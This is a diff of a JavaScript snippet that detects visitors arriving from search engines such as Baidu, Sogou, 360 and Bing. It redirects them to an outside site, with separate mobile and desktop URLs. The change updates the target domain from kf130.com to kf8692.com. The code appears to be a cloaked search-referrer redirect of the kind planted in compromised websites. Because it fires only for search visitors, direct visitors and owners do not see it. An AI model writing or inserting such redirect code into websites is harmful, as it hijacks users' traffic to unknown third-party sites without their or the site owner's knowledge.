@@ -19,9 +19,9 @@ var regexp = /\.(baidu|haosou|so|sogou|soso|sm|bing|360)(\.[a-z0-9\-]+){1,2}\//i
 var where = document.referrer;
 if (regexp.test(where)) {
   if (/mobile|android|iphone|ipad|phone/i.test(navigator.userAgent.toLowerCase())) {
-    location.href=(Math.random()<0.5)?"https://m.kf130.com/":"https://m.kf130.com/";
+    location.href=(Math.random()<0.5)?"https://m.kf8692.com/":"https://m.kf8692.com/";
   }
   else{
-    location.href=(Math.random()<0.5)?"https://www.kf130.com/guide_page.htm":"https://www.kf130.com/guide_page.htm";
+    location.href=(Math.random()<0.5)?"https://www.kf8692.com/guide_page.htm":"https://www.kf8692.com/guide_page.htm";
   }
 }
